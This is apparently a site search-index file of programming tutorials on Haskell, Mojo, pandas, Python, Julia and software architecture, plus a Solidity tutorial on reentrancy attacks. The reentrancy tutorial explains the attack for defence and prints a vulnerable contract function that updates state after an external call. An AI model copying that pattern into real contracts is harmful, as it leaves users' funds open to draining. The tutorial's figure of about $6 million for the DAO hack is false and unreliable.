insert $ Person \"John Doe\" 30 Reading Records: Retrieving data typically involves constructing queries to fetch records based on specific criteria.\npeople \u003c- selectList [PersonAge \u003c. 65] [Asc PersonName] Updating Records: Modifying data in the database can be accomplished by constructing update queries.\nupdateWhere [PersonName ==. \"John Doe\"] [PersonAge =. 31] Deleting Records: Removing data is straightforward with delete operations.\ndeleteWhere [PersonAge \u003c. 65] Examples Using SQLite and PostgreSQL linkPractical Database Integration:\nLet’s look at practical examples of integrating Haskell with SQLite and PostgreSQL, two widely used databases in the industry.\nConnecting to SQLite: Using the sqlite-simple library, you can connect to an SQLite database and perform operations.\nimport Database.SQLite.Simple main :: IO () main = do conn \u003c- open \"test.db\" execute conn \"INSERT INTO users (name) VALUES (?)\" (Only (\"Alice\" :: String)) r \u003c- query_ conn \"SELECT * FROM users\" :: IO [Only String] mapM_ print r close conn Using PostgreSQL with Opaleye: Opaleye provides a type-safe way of interacting with PostgreSQL, allowing you to construct SQL queries in Haskell syntax.\nimport Opaleye main :: IO () main = do conn \u003c- connectPostgreSQL \"host=localhost dbname=test user=test\" users \u003c- runQuery conn $ queryTable userTable mapM_ print users Conclusion:\nInterfacing with databases is a vital skill for any Haskell developer working on applications that require persistent data storage. By understanding and utilizing Haskell’s database libraries, you can ensure that your applications are robust, maintainable, and efficient. Embrace these techniques to enhance your Haskell projects and take full advantage of Haskell’s capabilities in database management.\nFrequently Asked Questions:\nQ: What are some common pitfalls when interfacing Haskell with databases? A: Common pitfalls include handling database connections improperly, leading to resource leaks, and not accounting for SQL injection attacks in dynamically constructed queries. Using high-level libraries helps mitigate these issues.\nQ: How can I ensure my Haskell database code is performant? A: Optimize your Haskell database interactions by using prepared statements, transaction control, and appropriate indexing in your database. Additionally, profiling tools can help identify bottlenecks.\n"
            }
        );
    index.add(
            {
                id:  142 ,
                href: "\/tutorials\/docs\/mojo\/mojo\/using_python_in_mojo\/",
                title: "Interoperability with Python",
                description: "Mojo Lang description",
                content: "Importing Python Modules in Mojo link Mojo’s ability to import and use Python modules is a significant advantage, especially for leveraging existing Python code. It utilizes the CPython interpreter, allowing seamless integration with Python modules. Example: Using NumPy in Mojo link from python import Python let np = Python.import_module(\"numpy\") ar = np.arange(15).reshape(3, 5) print(ar.shape) Note: NumPy must be installed in your Python environment. Limitations link While Mojo can import Python modules, it is not yet a feature-complete superset of Python. Therefore, not all Python code can be directly copied and run in Mojo. Running Python Code Examples in Mojo link1. Basic Calculator Example link def add(x, y): return x + y def subtract(x, y): return x - y def multiply(x, y): return x * y def divide(x, y): return x / y print(\"Select operation.\") print(\"1. Add\") print(\"2. Subtract\") print(\"3. Multiply\") print(\"4. Divide\") while True: choice = input(\"Enter choice (1/2/3/4): \") if choice in ('1', '2', '3', '4'): num1 = float(input(\"Enter first number: \")) num2 = float(input(\"Enter second number: \")) if choice == '1': print(num1, \"+\", num2, \"=\", add(num1, num2)) elif choice == '2': print(num1, \"-\", num2, \"=\", subtract(num1, num2)) elif choice == '3': print(num1, \"*\", num2, \"=\", multiply(num1, num2)) elif choice == '4': print(num1, \"/\", num2, \"=\", divide(num1, num2)) break else: print(\"Invalid Input\") 2. Using Tabulate Library link // Ensure Python tabulate is installed from python import Python let tabulate = Python.import_module(\"tabulate\") let text_data = \"\"\" Name Age Occupation Alice 25 Engineer Bob 30 Developer Charlie 40 Manager \"\"\" let rows = [row.strip().split() for row in text_data.strip().split(\"\\n\")] let table = tabulate.tabulate(rows, headers=\"firstrow\") print(table) 3. Text Extraction from Images with Tesseract OCR link // Ensure Python pytesseract and Pillow are installed import pytesseract from PIL import Image // Configure the Tesseract command if not in PATH pytesseract.pytesseract.tesseract_cmd = r'path_to_tesseract.exe' def read_image_text(image_path): image = Image.open(image_path) text = pytesseract.image_to_string(image) return text // Usage Example let image_path = \"path_to_image.png\" let text = read_image_text(image_path) print(text) "
            }
        );
    index.add(
            {
                id:  143 ,
                href: "\/tutorials\/docs\/pandas\/pandas\/introduction_to_data_types\/",
                title: "Introduction to Data Structures in Pandas",
                description: "This is an introduction to data structures in pandas, a python package for data analysis.",
                content: " linkPandas is a powerful and widely-used data manipulation library in Python, providing versatile data structures and functions designed to make data analysis and manipulation simple and efficient. This blog will introduce you to two primary data structures in Pandas: Series and DataFrame. Understanding these data structures is fundamental to harnessing the full potential of Pandas for data analysis.\nSeries linkA Series is a one-dimensional labeled array capable of holding any data type (integers, strings, floating point numbers, Python objects, etc.). It is similar to a column in a spreadsheet or a database table. Let’s dive into some key characteristics and functionalities of Series.\nSeries is ndarray-like linkA Pandas Series is built on top of NumPy’s ndarray. This means that a Series inherits many of the capabilities of ndarray, such as element-wise operations and array manipulations.\nimport pandas as pd import numpy as np data = np.array([1, 2, 3, 4]) s = pd.Series(data) print(s) Output:\n0 1 1 2 2 3 3 4 dtype: int64 Series is dict-like linkA Series can also be thought of as a fixed-size, ordered dictionary. It is an ideal structure for working with time series or other labeled data. You can access elements using labels (indexes) just like you would in a dictionary.\ndata = {'a': 1, 'b': 2, 'c': 3} s = pd.Series(data) print(s) print(s['a']) Output:\na 1 b 2 c 3 dtype: int64 1 Vectorized Operations and Label Alignment with Series linkPandas Series support vectorized operations, which allow you to perform operations on entire arrays without writing explicit loops. This feature leverages the speed of NumPy operations. Additionally, Series automatically aligns data based on the labels during arithmetic operations.\ns1 = pd.Series([1, 2, 3], index=['a', 'b', 'c']) s2 = pd.Series([4, 5, 6], index=['a', 'b', 'd']) s = s1 + s2 print(s) Output:\na 5.0 b 7.0 c NaN d NaN dtype: float64 Name Attribute linkThe name attribute in Series can be used to assign a name to the Series object or its index, which can be useful for debugging and keeping track of data in larger datasets.\ns = pd.Series([1, 2, 3], name=\"numbers\") print(s) print(s.name) Output:\n0 1 1 2 2 3 Name: numbers, dtype: int64 numbers DataFrame linkA DataFrame is a two-dimensional, size-mutable, and potentially heterogeneous tabular data structure with labeled axes (rows and columns). It is the most commonly used Pandas object. Let’s explore various ways to create DataFrames and their functionalities.\nFrom Dict of Series or Dicts linkYou can create a DataFrame from a dictionary of Series or dictionaries. Each Series becomes a column in the DataFrame.\ndata = { 'col1': pd.Series([1, 2, 3]), 'col2': pd.Series([4, 5, 6]) } df = pd.DataFrame(data) print(df) Output:\ncol1 col2 0 1 4 1 2 5 2 3 6 From Dict of ndarrays / Lists linkA DataFrame can also be created from a dictionary of NumPy arrays or lists. The arrays must be of the same length.\ndata = { 'col1': [1, 2, 3], 'col2': [4, 5, 6] } df = pd.DataFrame(data) print(df) Output:\ncol1 col2 0 1 4 1 2 5 2 3 6 From Structured or Record Array linkDataFrames can be constructed from structured or record arrays.\ndata = np.array([(1, 'A'), (2, 'B'), (3, 'C')], dtype=[('num', 'i4'), ('letter', 'U1')]) df = pd.DataFrame(data) print(df) Output:\nnum letter 0 1 A 1 2 B 2 3 C From a List of Dicts linkCreating a DataFrame from a list of dictionaries is straightforward, with each dictionary representing a row.\ndata = [ {'a': 1, 'b': 2}, {'a': 3, 'b': 4, 'c': 5} ] df = pd.DataFrame(data) print(df) Output:\na b c 0 1.0 2 NaN 1 3.0 4 5.0 From a Dict of Tuples linkDataFrames can also be created from dictionaries of tuples.\ndata = { 'col1': (1, 2, 3), 'col2': (4, 5, 6) } df = pd.DataFrame(data) print(df) Output:\ncol1 col2 0 1 4 1 2 5 2 3 6 From a Series linkCreating a DataFrame from a Series is possible and results in a single-column DataFrame.\ns = pd.Series([1, 2, 3], name=\"numbers\") df = pd.DataFrame(s) print(df) Output:\nnumbers 0 1 1 2 2 3 From a List of Namedtuples linkYou can also construct DataFrames from a list of namedtuples.\nfrom collections import namedtuple Person = namedtuple('Person', 'name age') data = [Person('Alice', 25), Person('Bob', 30)] df = pd.DataFrame(data) print(df) Output:\nname age 0 Alice 25 1 Bob 30 From a List of Dataclasses linkSimilarly, DataFrames can be created from a list of dataclasses.\nfrom dataclasses import dataclass @dataclass class Person: name: str age: int data = [Person('Alice', 25), Person('Bob', 30)] df = pd.DataFrame(data) print(df) Output:\nname age 0 Alice 25 1 Bob 30 Alternate Constructors linkPandas offers a range of alternate constructors for DataFrames, such as from_records, from_items, etc., to accommodate various data formats and structures.\nColumn Selection, Addition, Deletion linkSelecting, adding, and deleting columns in a DataFrame are straightforward tasks.\ndata = {'col1': [1, 2], 'col2': [3, 4]} df = pd.DataFrame(data) # Select column print(df['col1']) # Add column df['col3'] = [5, 6] print(df) # Delete column del df['col2'] print(df) Output:\n0 1 1 2 Name: col1, dtype: int64 col1 col2 col3 0 1 3 5 1 2 4 6 col1 col3 0 1 5 1 2 6 Assigning New Columns in Method Chains linkYou can assign new columns while chaining methods using the assign method.\ndf = df.assign(col4=lambda x: x['col1'] + x['col3']) print(df) Output:\ncol1 col3 col4 0 1 5 6 1 2 6 8 Indexing / Selection linkDataFrames offer robust indexing and selection capabilities. You can use .loc for label-based indexing and .iloc for positional indexing.\nprint(df.loc[0, 'col1']) print(df.iloc[0, 0]) Output:\n1 1 Data Alignment and Arithmetic linkDataFrames automatically align data during arithmetic operations, similar to Series.\ndf1 = pd.DataFrame({'A': [1, 2]}, index=['a', 'b']) df2 = pd.DataFrame({'B': [3, 4]}, index=['b', 'a']) result = df1 + df2 print(result) Output:\nA B a NaN NaN b NaN NaN Transposing linkTransposing a DataFrame swaps its rows and columns.\nprint(df.T) Output:\n0 1 col1 1 2 col3 "
            }
        );
    index.add(
            {
                id:  144 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/introduction-to-haskell\/",
                title: "Introduction to Haskell",
                description: "Begin your journey into Haskell and functional programming. Learn how to set up the Haskell environment with GHC and Stack and write your first Haskell program.",
                content: "Introduction:\nWelcome to the intriguing world of Haskell, a language that embodies the essence of functional programming with its emphasis on purity and immutability. If you’re drawn to Haskell, you’re likely intrigued by its elegance and robustness in tackling complex problems through simple, declarative code constructs. In this introductory guide, we will explore Haskell’s functional programming paradigm, set up the Haskell development environment, and write our very first program. Whether you’re a seasoned programmer or new to coding, Haskell offers a fresh perspective that can enhance your programming skills.\n1. Overview of Haskell and Its Functional Programming Paradigm\nHaskell is a statically typed, purely functional programming language known for its high level of abstraction. Unlike imperative languages where you write code that describes how to perform tasks, Haskell uses expressions to describe what something is. This shift from “how” to “what” abstracts away many of the low-level operations you need to perform in other languages, allowing you to focus more on problem-solving and less on implementation details.\na. Key Features of Haskell:\nPure Functions: Every function in Haskell is pure, meaning it always produces the same output for the same input and does not cause any side effects (like modifying a variable outside its scope). Immutability: Once a value is set, it cannot be changed. If you need to store a modified value, you create new data instead. Type Safety: Haskell’s type system helps catch errors at compile time, making your programs more secure and robust. Lazy Evaluation: Haskell only evaluates expressions when it absolutely needs to. This allows for very efficient algorithms and data structures such as infinite lists. 2. Setting Up the Haskell Environment with GHC and Stack\nTo begin programming in Haskell, you need to set up your development environment. The Glasgow Haskell Compiler (GHC) is the most widely used Haskell compiler, and Stack is a cross-platform program for developing Haskell projects that simplifies dependency management.\na. Installing GHC and Stack:\nOn Windows: You can download the Haskell Platform from haskell.org/platform, which includes GHC, Stack, and other useful tools. On MacOS and Linux: It’s recommended to install Stack through your package manager (like Homebrew on MacOS or apt on Ubuntu), and it will handle the installation of GHC for you. # On MacOS brew install haskell-stack # On Ubuntu sudo apt-get install haskell-stack b. Setting Up Your First Project: Once Stack is installed, you can set up your first project:\nstack new hello-haskell simple cd hello-haskell stack setup stack build This sequence of commands creates a new project directory, sets up the necessary GHC version, and builds the initial project.\n3. Writing Your First Haskell Program: Hello, World!\nNow, let’s dive into writing our first Haskell program. In the project directory created by Stack, you’ll find a file named app/Main.hs. Open this file, and you’ll see a sample program. Replace its contents with the following:\nmodule Main where main :: IO () main = putStrLn \"Hello, World!\" a. Understanding the Code:\nmodule Main where declares that this is the main module. main :: IO () is the type signature, indicating that main is a function with no inputs and returns an IO action (side effect), which in this case, is printing a string. putStrLn \"Hello, World!\" is a function that prints the string \"Hello, World!\" to the terminal. b. Running Your Program: You can run your program using Stack by typing:\nstack run You should see “Hello, World!” printed in your terminal.\nConclusion:\nCongratulations! You’ve just set up your Haskell development environment and written your first Haskell program. This is just the beginning of your journey with Haskell and functional programming. As you delve deeper into Haskell’s features, you’ll discover powerful ways to express complex ideas through concise and elegant code. Happy coding!\nFrequently Asked Questions:\nQ: How do I learn more about functional programming concepts? A: Consider reading books like “Learn You a Haskell for Great Good!” or “Real World Haskell,” both of which provide excellent introductions to both Haskell and functional programming.\nQ: What are some common uses for Haskell? A: Haskell is often used in academia for teaching programming concepts, in industries for data analysis, and anywhere robustness and correctness are paramount, such as in financial services.\n"
            }
        );
    index.add(
            {
                id:  145 ,
                href: "\/tutorials\/docs\/python\/python\/python_introduction\/",
                title: "Introduction to Python",
                description: "Explore the essentials of Python programming in this comprehensive introduction. Discover why Python is favored for its simplicity and versatility across many disciplines, learn how to install it on different operating systems, and write your first Python program.",
                content: "Python is a high-level, interpreted programming language known for its simplicity and readability, which has made it one of the most popular languages in the world. Developed by Guido van Rossum and first released in 1991, Python’s design philosophy emphasizes code readability with its notable use of significant whitespace.\nWhy Use Python? link Ease of Learning and Use: Python’s straightforward syntax closely mirrors the human language, which reduces the complexity of programming tasks and makes it accessible to beginners. Versatility: From web development to data science and artificial intelligence, Python’s flexibility allows it to be used across nearly all programming disciplines. Powerful Standard Library: Python’s standard library is vast, offering modules and packages for a wide range of tasks. Rich Ecosystem: A vibrant community contributes to an ever-growing pool of resources such as frameworks, tools, and libraries like Django for web development, Pandas for data analysis, and TensorFlow for machine learning. Community and Support: Python benefits from a large and active community, which provides excellent peer support through forums, social media, and numerous conferences worldwide. Installing Python linkPython can be installed on any operating system: Windows, macOS, and Linux. Here’s how you can install Python across different platforms:\nWindows: link Visit the official Python website at python.org. Download the latest version for Windows. Run the downloaded executable file. Ensure that you check the box that says “Add Python 3.x to PATH” at the beginning of the installation process. Click “Install Now” and follow the on-screen instructions to complete the installation. macOS: link Install Homebrew, a package manager for macOS, if it’s not already installed. Open the Terminal and run: /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\" Use Homebrew to install Python: brew install python This command installs Python and pip, making it easy to manage packages. Linux (Ubuntu): link Python is usually pre-installed on Ubuntu. You can verify the installation and check the version by typing: python3 --version If it’s not installed, you can install it by running: sudo apt update sudo apt install python3 Hello World Example linkA “Hello World” program is a simple script that outputs “Hello, world!” to the console, serving as a traditional first step in learning a new programming language. Here’s how you can write and run a Hello World program in Python:\nOpen a text editor and create a new file named hello_world.py. Type the following Python code: print(\"Hello, world!\") Save the file and run it from your command line: python3 hello_world.py Conclusion linkThis introduction to Python provides the groundwork for starting your programming journey. Upcoming sections will delve into Python syntax, programming constructs, and eventually more complex concepts such as object-oriented programming and web development with Python.\n"
            }
        );
    index.add(
            {
                id:  146 ,
                href: "\/tutorials\/docs\/technical-architecture\/technical-architecture\/introduction_to_technical_arch\/",
                title: "Introduction to Technical Architecture: Principles and Best Practices",
                description: "In the rapidly evolving landscape of technology, having a robust technical architecture is crucial for the success of any software project. Technical architecture lays the foundation for how a system will be built, deployed, and maintained. This blog post aims to provide an overview of technical architecture, its significance, and the fundamental principles guiding effective architectural practices. We will also explore best practices and common pitfalls to avoid, ensuring that your projects are built on a solid architectural foundation.",
                content: "In the rapidly evolving landscape of technology, having a robust technical architecture is crucial for the success of any software project. Technical architecture lays the foundation for how a system will be built, deployed, and maintained. This blog post aims to provide an overview of technical architecture, its significance, and the fundamental principles guiding effective architectural practices. We will also explore best practices and common pitfalls to avoid, ensuring that your projects are built on a solid architectural foundation.\nDefinition and Scope of Technical Architecture linkWhat is Technical Architecture? linkTechnical architecture refers to the structured framework used to conceptualize, design, and manage the components of a system. It encompasses the hardware, software, data, and networking components that interact to fulfill the system’s objectives. Technical architecture serves as a blueprint that guides the development, deployment, and maintenance of technology solutions.\nScope of Technical Architecture linkThe scope of technical architecture includes:\nHardware and Infrastructure: Physical servers, cloud services, and networking equipment. Software Components: Operating systems, middleware, applications, and utilities. Data Management: Databases, data warehouses, and data lakes. Networking: Protocols, topologies, and communication mechanisms. Security: Measures to protect data and systems from threats and vulnerabilities. Core Principles of Technical Architecture linkTo build effective and resilient systems, certain core principles must be adhered to. These principles ensure that the architecture can meet current and future needs.\n1. Scalability linkScalability refers to the system’s ability to handle growth, whether in terms of users, data volume, or transaction load. A scalable architecture can expand efficiently without compromising performance or stability.\nKey Practices:\nModular Design: Break down the system into manageable, independent modules. Load Balancing: Distribute workloads evenly across multiple servers. Elasticity: Utilize cloud services that can automatically scale resources up or down. 2. Performance linkPerformance is critical for user satisfaction and operational efficiency. It involves optimizing the system to ensure fast response times and minimal downtime.\nKey Practices:\nCaching: Store frequently accessed data in fast-access storage. Efficient Algorithms: Implement algorithms and data structures that minimize processing time. Resource Optimization: Ensure optimal use of CPU, memory, and storage. 3. Security linkSecurity involves protecting the system from unauthorized access and ensuring data integrity and confidentiality.\nKey Practices:\nAuthentication and Authorization: Implement strong user authentication and access control mechanisms. Encryption: Encrypt data in transit and at rest. Regular Audits: Conduct security audits and vulnerability assessments. 4. Maintainability linkMaintainability ensures that the system can be easily updated, fixed, and improved over time without excessive cost or effort.\nKey Practices:\nClear Documentation: Maintain comprehensive and up-to-date documentation. Modular Code: Write modular, clean, and well-commented code. Automated Testing: Implement continuous integration and automated testing to detect issues early. Best Practices in Technical Architecture linkAdopting a Layered Architecture linkLayered architecture divides the system into distinct layers, each responsible for specific aspects of the application. Common layers include presentation, business logic, data access, and infrastructure.\nUsing Design Patterns linkDesign patterns are proven solutions to common problems in software design. Patterns like Model-View-Controller (MVC), Singleton, and Factory can help create robust and maintainable systems.\nEmphasizing Documentation linkComprehensive documentation is vital for knowledge transfer and future maintenance. It should cover system design, data flow, interfaces, and dependencies.\nRegular Code Reviews linkConducting regular code reviews helps maintain code quality, ensures adherence to standards, and fosters knowledge sharing among team members.\nImplementing Continuous Integration and Continuous Deployment (CI/CD) linkCI/CD pipelines automate the process of testing, building, and deploying applications, leading to faster and more reliable releases.\nCommon Pitfalls to Avoid linkOver-Engineering linkAvoid the temptation to over-engineer solutions. Complex architectures can become difficult to manage and maintain. Strive for simplicity and only introduce complexity when absolutely necessary.\nIgnoring Non-Functional Requirements linkNon-functional requirements like performance, security, and maintainability are just as important as functional requirements. Neglecting them can lead to systems that are difficult to scale, insecure, or costly to maintain.\nLack of Proper Testing linkInadequate testing can result in undetected bugs and vulnerabilities. Implement a robust testing strategy that includes unit tests, integration tests, and end-to-end tests.\nPoor Documentation linkFailing to document the architecture can lead to misunderstandings and difficulties in future maintenance. Ensure that all aspects of the system are well-documented and accessible.\nConclusion linkTechnical architecture is the backbone of any successful software system. By adhering to core principles like scalability, performance, security, and maintainability, and by following best practices, you can design architectures that are robust, efficient, and easy to maintain. Avoiding common pitfalls and continuously refining your approach will ensure that your systems can meet both current and future demands.\nInvesting time and effort into creating a solid technical architecture upfront will pay off in the long run, resulting in systems that are resilient, scalable, and aligned with business objectives.\n"
            }
        );
    index.add(
            {
                id:  147 ,
                href: "\/tutorials\/docs\/full-stack-projects\/full-stack-projects\/creating_a_job_summarizer_using_streamlit_and_open_ai\/",
                title: "Job Description Summarizer with Streamlit and OpenAI",
                description: "How to install and use libraries",
                content: "In this tutorial, we’ll build a web application that summarizes job descriptions using AI. We’ll use Streamlit for the frontend and OpenAI’s GPT model for generating the summaries. The application will take a job description as input and output a summarized version, highlighting the job title, responsibilities, and requirements.\n1. Introduction linkWe’ll create a web application that uses OpenAI’s GPT model to summarize job descriptions. The summarizer will extract and categorize important information from the job description, such as the job title, responsibilities, and requirements, and provide insights on how to highlight these skills in a resume.\n2. Setting Up the Environment linkFirst, make sure you have Python installed on your machine. Then, install the required libraries:\npip install streamlit openai langchain environs 3. Writing the Summarizer Function linkCreate a directory named app and within it, create a file named summarizer.py. This file will contain the logic to summarize the job descriptions using OpenAI’s GPT model.\napp/summarizer.py link import os from environs import Env from langchain import PromptTemplate from langchain.llms import OpenAI env = Env() env.read_env(\".env\") # read .env file, if it exists api_key = os.getenv(\"OPENAI_API_KEY\") def summarize_jd(job_description): template = \"\"\" You are a career services professional with over 10 years of experience in the {industry} primarily operating in the {location}. You are tasked with finding skills from a job description for the role of {role}. Here is the job description: {job_description} Please analyze this job description to identify the skills, and categorize them as follows: - Job Title: Assess the job title as it may contain key terms that should be mirrored in the resume. - Responsibilities: Focus on responsibilities and action verbs that align with the role. - Requirements: Look for requirements such as education, experience, and certifications. Advise on how these identified skills can be effectively highlighted in a resume to ensure it aligns well with the requirements of this role. Please avoid cliches and generic answers, focusing on unique and specific insights related to the provided job description. \"\"\" prompt = PromptTemplate( input_variables=[\"industry\", \"location\", \"role\", \"job_description\"], template=template, ) # Formats the prompt with the addition of the input variables final_prompt = prompt.format(industry=\"Software Engineering\", location=\"United States\", role=\"Golang Engineer\", job_description=job_description) llm = OpenAI(openai_api_key=api_key) summary = llm(final_prompt) return summary In this file, we define a function summarize_jd that takes a job description as input and returns a summarized version. The function uses OpenAI’s GPT model to generate the summary based on a custom prompt template.\n4. Building the Streamlit App linkCreate a file named main.py in the root directory of your project. This file will contain the Streamlit code to build the web interface.\nmain.py link import streamlit as st from app.summarizer import summarize_jd # Set page title st.set_page_config(page_title=\"Job Description Summarizer\", page_icon=\"📜\", layout=\"wide\") # Set title st.title(\"Job Description Summarizer\", anchor=False) st.header(\"Summarize Job Description with AI\", anchor=False) with st.form(\"my_form\"): # Input JD (pasted by user) jd = st.text_area(\"Paste the job description here\", value=\"\") def submit_form(): summary = summarize_jd(jd) st.write(summary) submit = st.form_submit_button(label=\"Summarize\", on_click=submit_form) In this file, we create a Streamlit app with a form where users can paste a job description. When the form is submitted, the summarize_jd function is called to generate the summary, which is then displayed on the page.\n5. Running the Application linkTo run the application, navigate to the project directory in your terminal and run:\nstreamlit run main.py This command will start a local Streamlit server and open the application in your default web browser.\nConclusion linkIn this tutorial, we created a web application that summarizes job descriptions using AI. We used Streamlit for the frontend and OpenAI’s GPT model for generating the summaries. This application can be extended further to include more advanced features like user authentication, saving summaries, and more. This project demonstrates the power of combining Streamlit and OpenAI to create useful AI-powered tools.\n"
            }
        );
    index.add(
            {
                id:  148 ,
                href: "\/tutorials\/docs\/julia\/",
                title: "Julia",
                description: "Julia, a high-level, high-performance programming language, is designed for technical computing. It combines the simplicity of Python with the power of languages like C or Fortran. Julia is known for its impressive speed and is widely used in scientific computing, machine learning, data mining, large-scale linear algebra, and more.",
                content: ""
            }
        );
    index.add(
            {
                id:  149 ,
                href: "\/tutorials\/docs\/keras\/",
                title: "keras",
                description: "Keras is an open source deep learning framework for python. It has been developed by an artificial intelligence researcher at Google named Francois Chollet. Leading organizations like Google, Square, Netflix, Huawei and Uber are currently using Keras. This tutorial walks through the installation of Keras, basics of deep learning, Keras models, Keras layers, Keras modules and finally conclude with some real-time applications.",
                content: ""
            }
        );
    index.add(
            {
                id:  150 ,
                href: "\/tutorials\/docs\/julia\/julia\/advanced_features_in_julia\/",
                title: "Learn About Advanced Features with Julia",
                description: "Julia, a high-level, high-performance programming language, is designed for technical computing",
                content: "This section delves into some of the more advanced features of Julia, including metaprogramming, concurrency, and parallel computing, as well as a look at Julia’s package ecosystem and error handling techniques.\nMetaprogramming in Julia linkMetaprogramming refers to the creation of programs that can manipulate other programs as their data. Julia has powerful metaprogramming capabilities, allowing programs to generate, modify, and execute code dynamically.\nExample of metaprogramming:\n# Defining a macro in Julia macro sayhello(name) return :( println(\"Hello, \", $name) ) end # Using the macro @sayhello(\"World\") Concurrency and Parallel Computing linkJulia offers several constructs for concurrent and parallel programming. This includes multi-threading and distributed computing, enabling efficient utilization of multi-core processors and computer clusters.\nExample of multi-threading:\nusing Base.Threads # Function to be executed in parallel function parallel_sum(array) sum = 0 @threads for i in array sum += i end return sum end # Executing the function with multiple threads result = parallel_sum(1:100) println(\"Parallel sum result: \", result) Packages and Modules linkJulia has a rich ecosystem of packages that extend its capabilities. The package manager, Pkg, is used to add, remove, and manage Julia packages. Modules in Julia help in organizing code into namespaces.\nExample of using a package:\nusing Pkg Pkg.add(\"Example\") using Example println(Example.hello(\"world\")) Error Handling and Debugging linkEffective error handling and debugging are crucial for robust software development. Julia provides try-catch blocks for error handling and a debugger for diagnosing problems in code.\nExample of error handling:\nfunction safe_divide(a, b) try return a / b catch e println(\"Error: \", e) return nothing end end # Testing the function safe_divide(10, 0) Code Example: Advanced Julia Program linkLet’s create an advanced example that showcases Julia’s capabilities in handling exceptions and working with modules:\nmodule AdvancedOperations export advanced_divide function advanced_divide(x, y) if y == 0 throw(DivideError()) end return x / y end end using .AdvancedOperations try result = advanced_divide(10, 0) println(\"Result: \", result) catch e println(\"Caught an error: \", e) end This code demonstrates the use of modules, exporting functions, exception handling, and custom error throwing in Julia.\n"
            }
        );
    index.add(
            {
                id:  151 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/reentrancy_attacks\/",
                title: "Learn About Reentracny Attacks and how to Prevent them",
                description: "Learn how blockchain reentrancy attacks work and how to protect your smart contracts from them.",
                content: "What is a Solidity Reentrancy Attack? linkIn Solidity smart contracts, a reentrancy attack occurs when an external contract is called, allowing the function to be recursively called before its initial execution is complete. This can enable the external contract to manipulate the state of the original contract before it finishes executing.\nReentrancy attacks exploit state synchronization issues, occurring when the state is not updated before making an external call. For instance, if a function checks a condition, updates the state, and then makes an external call, an attacker can re-enter the function in the middle of its execution, bypassing the updated state and potentially draining funds.\nTypes of Smart Contract Reentrancy Attacks link1. Single Function Reentrancy\nThis basic form of reentrancy attack involves a single function within a contract being re-entered. This typically happens when the function modifies the contract’s state and then calls an external contract or sends Ether without first updating its internal state variables.\n2. Cross-Function Reentrancy\nIn cross-function reentrancy, one function performs an external call before updating the state, and the external contract calls another function that depends on this state. This can lead to unexpected interactions, allowing an attacker to manipulate the contract’s state across multiple functions.\n3. Cross-Contract Reentrancy\nCross-contract reentrancy involves interactions between functions in multiple contracts where the state is shared. If the shared state in the first contract is not updated before an external call, other contracts that depend on the shared state can be re-entered.\n5. Cross-Chain Reentrancy\nCross-chain reentrancy, though less common, involves interactions between smart contracts on different blockchain networks. This scenario arises in interoperability protocols or decentralized exchanges (DEXs) facilitating transactions across multiple blockchains.\n6. Read-Only Reentrancy\nRead-only reentrancy occurs when an external call is made to another contract, but the called contract’s function does not modify its state. Instead, the called function reads data from the calling contract and then reenters it, potentially causing unexpected behavior.\nHow to prevent Solidity Reentrancy Attacks linkUse the Checks-Effects-Interactions Pattern linkEnsure that state changes are made before interacting with external contracts or sending Ether. Modify the execution order to follow the Checks-Effects-Interactions pattern:\nChecks: Verify the state of the caller. Effects: Update the global state. Interactions: Perform the external call. Example:\nmapping(address =\u003e uint) public balance; function withdraw(uint amount) public { // 1. Checks require(balance[msg.sender] \u003e= amount); // 2. Effects balance[msg.sender] -= amount; // 3. Interactions msg.sender.call{value: amount}(\"\"); emit Withdrawal(msg.sender, amount); } Implement Mutexes or Locks linkA mutex (mutual exclusion) mechanism prevents a function from being executed multiple times within the same transaction. This is typically done using a boolean flag.\nExample Using Reentrancy Guard:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.18; import {ReentrancyGuard} from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\"; contract ReentracyProtected is ReentrancyGuard { mapping(address =\u003e uint) public balances; function withdraw() external nonReentrant { uint balance = balances[msg.sender]; require(balance \u003e 0, \"Insufficient balance\"); balances[msg.sender] = 0; (bool success, ) = address(msg.sender).call{ value: balance }(\"\"); require(success, \"Failed to withdraw\"); } } Perform Extensive Code Review and Testing link Audits: Multiple rounds of smart contract audits can significantly decrease the chance of a reentrancy attack. Thorough Testing: Beyond audits, thorough testing, including invariant testing, is crucial to ensure smart contract security. Examples of Smart Contract Reentrancy Attacks linkThe DAO Hack: In 2016, the DAO, a decentralized investment fund, was exploited due to a reentrancy vulnerability. The attacker was able to repeatedly withdraw funds before the contract could update its balance, resulting in the theft of approximately $6 million worth of Ether.\nCurve Finance: On July 30th, 2023, Curve Finance, a decentralized finance (DeFi) protocol, was attacked due to a Vyper compiler bug, leading to a loss of nearly $70 million.\nReentrancy Example linkA vulnerability is found in the HypercertMinter::splitValue function, which calls _mintBatch() before updating the storage. This violates the Checks-Effects-Interactions pattern, making it vulnerable to a reentrancy attack.\nVulnerable Code:\nfunction _splitValue(address _account, uint256 _tokenID, uint256[] calldata _values) internal { uint256 valueLeft = tokenValues[_tokenID]; for (uint256 i; i \u003c len;) { valueLeft -= values[i]; tokenValues[toIDs[i]] = values[i]; unchecked { ++i; } } _mintBatch(_account, toIDs, amounts, \"\"); tokenValues[_tokenID] = valueLeft; emit BatchValueTransfer(typeIDs, fromIDs, toIDs, values); } The above code is susceptible to reentrancy attacks as the state is not updated before the external call to _mintBatch(), allowing an attacker to exploit this vulnerability.\nConclusion linkReentrancy attacks are a significant vulnerability in Solidity smart contracts, enabling attackers to manipulate contract states and potentially drain funds. This article explored the mechanics of reentrancy attacks, their types, mitigation strategies, and real-world examples like the DAO hack and Curve Finance incident. Emphasizing the importance of security measures and thorough auditing is crucial in preventing such attacks.\nBy understanding and implementing these strategies, developers can secure their smart contracts against reentrancy attacks and ensure the integrity of their blockchain applications.\n"
            }
        );
    index.add(
            {
                id:  152 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/testing_in_solidity\/",
                title: "Learn How To Write Unit Tests In Solidity",
                description: "Learn about Solidity, basics, language syntax and more.",
